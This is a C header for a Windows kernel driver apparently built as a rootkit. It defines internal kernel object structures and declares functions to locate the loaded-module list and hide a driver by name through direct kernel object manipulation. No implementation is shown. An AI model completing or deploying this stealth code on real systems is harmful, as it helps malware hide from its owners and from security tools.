/*
 *      name: ZION system DKOM Driver kernel
 *      Org Author: Liang Chen
 *      Version : 0.2
 */
#pragma once

#include <ntddk.h>
#include <windef.h>
#include <memory.h>
#include "zion/server/zion_common.h"
#include "zion/zion_cmd_packet.h"
#include "../include/zion/zion_dkom_def.h" 
#include "zion_server_helper.h"
#define NUMBER_HASH_BUCKETS 37

typedef struct _OBJECT_DIRECTORY_ENTRY {
    struct _OBJECT_DIRECTORY_ENTRY *ChainLink;
    PVOID Object;
} OBJECT_DIRECTORY_ENTRY, *POBJECT_DIRECTORY_ENTRY;

typedef struct _OBJECT_DIRECTORY {
    struct _OBJECT_DIRECTORY_ENTRY *HashBuckets[ NUMBER_HASH_BUCKETS ];
    struct _OBJECT_DIRECTORY_ENTRY **LookupBucket;
    BOOLEAN LookupFound;
    USHORT SymbolicLinkUsageCount;
    struct _DEVICE_MAP *DeviceMap;
} OBJECT_DIRECTORY, *POBJECT_DIRECTORY;
typedef struct _DEVICE_MAP {
    ULONG ReferenceCount;
    POBJECT_DIRECTORY DosDevicesDirectory;
    ULONG DriveMap;
    UCHAR DriveType[ 32 ];
} DEVICE_MAP, *PDEVICE_MAP;

typedef struct _OBJECT_HEADER_NAME_INFO {
    POBJECT_DIRECTORY Directory;
    UNICODE_STRING Name;
    ULONG Reserved;
} OBJECT_HEADER_NAME_INFO, *POBJECT_HEADER_NAME_INFO;
typedef struct _ZION_MODULE_ENTRY {
    LIST_ENTRY ModuleLink;
    DWORD  unknown[4];
    DWORD  base;
    DWORD  driver_start;
    DWORD  Size;
    UNICODE_STRING driver_Path;
    UNICODE_STRING driver_Name;
} ZION_MODULE_ENTRY, *PZION_MODULE_ENTRY;
typedef struct _OBJECT_HEADER {
	DWORD        PointerCount;       
	DWORD        HandleCount;        
	POBJECT_TYPE ObjectType;         
	BYTE         NameInfoOffset;       
	BYTE         HandleDBOffset;    
	BYTE         QuotaChargesOffset; 
	BYTE         ObjectFlags;        
	union
	{ 
		DWORD        QuotaBlock;
		DWORD ObjectCreateInfo;
	};
	PSECURITY_DESCRIPTOR SecurityDescriptor;
	float Body;
} OBJECT_HEADER, *POBJECT_HEADER;

#define OBJECT_TO_OBJECT_HEADER( o ) \
CONTAINING_RECORD( (o), OBJECT_HEADER, Body )

#define OBJECT_HEADER_TO_NAME_INFO( oh ) ((POBJECT_HEADER_NAME_INFO) \
((oh)->NameInfoOffset == 0 ? NULL : ((PCHAR)(oh) - (oh)->NameInfoOffset)))

NTSTATUS ObOpenObjectByName (IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN POBJECT_TYPE ObjectType OPTIONAL, IN KPROCESSOR_MODE AccessMode,
    IN OUT PACCESS_STATE AccessState OPTIONAL, IN ACCESS_MASK DesiredAccess OPTIONAL,
        IN OUT PVOID ParseContext OPTIONAL, OUT PHANDLE Handle);

VOID StealthInitializeLateMore(WCHAR *FileName);
BOOL GetPsLoadedModuleListAddr(PZION_MODULE_ENTRY *Head);
BOOL DKOM_MODULE_SERVER(PVOID ptrBufferAddr);
BOOL DKOM_HideModuleByName(PZION_MODULE_ENTRY ptrNt, WCHAR *FileName);